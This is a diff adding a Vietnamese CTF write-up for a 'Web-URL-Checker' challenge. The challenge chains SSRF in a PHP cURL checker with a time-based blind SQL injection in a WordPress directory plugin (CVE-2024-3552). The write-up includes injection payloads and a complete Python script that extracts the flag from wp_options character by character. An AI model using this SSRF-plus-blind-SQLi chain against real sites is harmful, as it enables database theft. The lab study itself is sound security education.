@@ -380,6 +380,166 @@ Tiếp theo cùng sử dụng lệnh **ls /** để kiểm tra flag có file ng�
 Get FLAG thành công như hình bên dưới: <br>
 <img width="1903" height="361" alt="image" src="https://github.com/user-attachments/assets/5b35b095-3b1e-4ca1-94af-da73d95b0495" />
 
+## Phân Tích Challenge (Web-URL-Checker)
+Đầu tiên vào challenge trang web thì web sẽ hiển thị cho chúng ta một link nhập URL thì ta thử nhập một đường dẫn như http://google.com và trả về trạng thái status 405 như hình bên dưới : <br>
+<img width="942" height="377" alt="image" src="https://github.com/user-attachments/assets/c8690f86-ddd1-4f81-9c20-a17859dca3cb" /> <br>
+Và đầu tiên mình sẽ xem thử flag nằm ở đâu thì trong entrypoint.sh có wp option add chèn một hàng vào bảng wp_options (tiền tố bảng ở script là wp_), nên nội dung ctf_flag nằm ở wp_options.option_value: <br>
+```note
+  wp option add ctf_flag 'cybercon{REDACTED}' --allow-root || true
+```
+Rồi bây giờ xem thử mã nguồn **index.php** Ở đây nó lấy 2 tham số u và b và kiểm tra User-Agent không phải số 42 thì in ra dòng **Do you now...** sau đó nó khởi nó dùng regex để kiểm tra đầu vào http và https sau đó nó cấu hình thực hiện request bằng Curl sau đó hiển thị trạng thái kết quả chúng ta bằng status của http chứ không in ra nội dung: <br>
+```php
+$url = $_GET['u'];
+$raw = $_GET['b'] ?? '';
+
+if (!isset($_SERVER['HTTP_USER_AGENT']) || stripos($_SERVER['HTTP_USER_AGENT'], '42') === false) {
+    echo 'Do you know about the secret number?';
+    exit;
+}
+
+if (!preg_match('#^https?://#i', $url)) {
+    echo 'There is no such planet :(';
+    exit;
+}
+
+$ch = curl_init($url);
+curl_setopt_array($ch, [
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_FOLLOWLOCATION => true,
+    CURLOPT_TIMEOUT        => 30,
+    CURLOPT_POSTFIELDS     => $raw,
+]);
+
+curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+$cls = ($http_code >= 200 && $http_code < 300) ? 'ok'
+     : ($http_code >= 400 ? 'fail' : 'warn');
+echo '<!doctype html><meta charset="utf-8"><link rel="stylesheet" href="/space.css">
+<div class="container"><h1><span class="logo-dot"></span>URL Checker</h1>
+<div class="status ' . $cls . '">Done (Status Code ' . $http_code . ')</div></div>';
+```
+Ở file **Apache-cms-local.conf** như sau nó chỉ cho phép truy cập nếu chúng ta là localhost vậy khi nghe tới đây mình nghĩ ngay tới ssrf: <br>
+```note
+<Location "/cms">
+    Require local
+</Location>
+```
+Sau quá trình xem xét tất cả các file có 1 thư mục **Web-Directory-Free** nó là một Web Của WordPress và sau khi kiểm tra kĩ thì mình phát hiện ở file **/classes/ajax_controller.php** ở hàm **get_map_marker_info()** có dính lỗi SQL Injection nó lấy biến **location_ids** dưới dạng mảng và truyền trực tiếp vào mà không có sự lọc đầu vào và bằng cách đó mình có thể SSRF vào /cms của wordpress sau đó lợi dụng hàm này bị lỗi và khai thác SQL và do chỉ trả về trạng thái status code nên đây có thể trở thành là **blind SQL**:
+```php
+[....]
+public function get_map_marker_info() {
+		global $wpdb;
+
+		if (isset($_POST['locations_ids'])) {
+			
+			$locations_option_array = array();
+			
+			$locations_ids = w2dc_getValue($_POST, 'locations_ids');
+			foreach ($locations_ids AS $location_id) {
+				$map_id = w2dc_getValue($_POST, 'map_id');
+				$show_summary_button = w2dc_getValue($_POST, 'show_summary_button');
+				$show_readmore_button = w2dc_getValue($_POST, 'show_readmore_button');
+	
+				$row = $wpdb->get_row("SELECT * FROM {$wpdb->w2dc_locations_relationships} WHERE id=".$location_id, ARRAY_A);
+[...]
+```
+Và sau khi tìm kiếm thông tin mình phát hiện được wordpress này dính CVE và có lỗ hổng SQL ở Method: get_map_marker_info như trên <a href="https://github.com/truonghuuphuc/CVE-2024-3552-Poc?tab=readme-ov-file">CVE-2024-3552</a> sau đó mình thử nghiệm bằng cách ssrf vào wordpress sau đó truyền payload thông qua tham số b. <br>
+Và cần double encoding payload trước khi gửi request <br>
+Payload 1: **action=w2dc_get_map_marker_info&locations_ids%5B%5D=(select+if(1=2,sleep(6),0)+from+(select+1)x)** <br>
+<img width="1919" height="942" alt="image" src="https://github.com/user-attachments/assets/79642fa6-3fbc-42aa-9d6f-4f28ff91336b" /> <br>
+Payload 2: **action=w2dc_get_map_marker_info&locations_ids%5B%5D=(select+if(1=1,sleep(6),0)+from+(select+1)x)** <br>
+<img width="1919" height="932" alt="image" src="https://github.com/user-attachments/assets/bf63d32c-df04-4b5d-a187-64e5f03eb201" /> <br>
+Vậy đã thành công inject được lệnh thành công và tiếp theo có thể sử dụng blind_sql với sleep để trích xuất flag <br>
+## Khai thác
+Với những điều đã nói trên mình sẽ viết tập lệnh python khai thác <br>
+```python
+
+import time, requests, string
+from urllib.parse import quote_plus
+
+class Exploit:
+    def __init__(self, baseURL, timeout=40, sleep_exec=6):
+        self.baseURL = baseURL.rstrip("/")
+        self.u = "http://127.0.0.1:80/cms/wp-admin/admin-ajax.php"
+        self.timeout = timeout
+        self.sleep = int(sleep_exec)
+        self.header = {"User-Agent": "42", "Accept-Encoding": "identity"}
+        self.hex_ctf_flag = "0x6374665f666c6167"
+        self.patern_flag = "cybercon{"
+        self.charset = string.ascii_uppercase + string.digits + "}"
+
+    def encode_char(self, body: str):
+        enc = quote_plus(body, safe="")       
+        return enc.replace("%5B%5D", "%255B%255D")  
+
+    def buil_url(self, b_encoded: str):
+        return f"{self.baseURL}/?u={self.u}&b={b_encoded}"
+
+    def send_request(self, b_encoded: str) -> float:
+        url = self.buil_url(b_encoded)
+        start = time.perf_counter()
+        requests.get(url, headers=self.header, timeout=self.timeout)
+        return time.perf_counter() - start
+    
+    def base_line(self) -> str:
+        body = "action=w2dc_get_map_marker_info&locations_ids[]=1"
+        return self.encode_char(body)
+
+    def char_encode(self, pos: int, ch: str):
+        hexch = ch.encode().hex()
+        cond = (f"substring((select+option_value+from+wp_options+where+option_name={self.hex_ctf_flag}"
+                f"+limit+1),{pos},1)=0x{hexch}")
+        body = ("action=w2dc_get_map_marker_info&locations_ids[]="
+                f"(select+if({cond},sleep({self.sleep}),0)+from+(select+1)x)")
+        return self.encode_char(body)
+    
+    def extract_flag(self, max_len=64):
+        base_time = min(self.send_request(self.base_line()) for _ in range(2))
+        diffTime = base_time + self.sleep * 0.6
+        print(f"[*] BaseTime ~{base_time:.2f}s; diffTime ~{diffTime:.2f}s")
+        flag = self.patern_flag
+        start_pos = len(self.patern_flag) + 1
+        print(f"[*] Brute Force Flag: '{self.patern_flag}'")
+
+        for pos in range(start_pos, start_pos + max_len):
+            found = False
+            for ch in self.charset:
+                time = self.send_request(self.char_encode(pos, ch))
+                if time >= diffTime:
+                    flag += ch
+                    print(f"[+] Found Char {pos}: '{ch}'  (DiffTime={time:.2f}s)  -> {flag}")
+                    found = True
+                    break
+            if not found:
+                print(f"[*] Stop at pos {pos}.")
+                break
+            if flag.endswith('}'):
+                print("[*] Found Char '}' — Done Flag.")
+                break
+
+        print(("[+] DONE FLAG: " + flag) 
+              if flag.endswith('}')
+                else "[-] NOT FOUND FLAG. TRY AGAIN")
+
+if __name__ == "__main__":
+    BASE_URL = "http://127.0.0.1:8000"
+    exploit = Exploit(BASE_URL)
+    exploit.extract_flag()
+```
+Get FLAG thành công như hình bên dưới: <br>
+<img width="681" height="226" alt="image" src="https://github.com/user-attachments/assets/6762183a-6c54-4c4b-9226-bd30332a6924" />
+
+
+
+
+
+
+
+
+
+
 
 
 
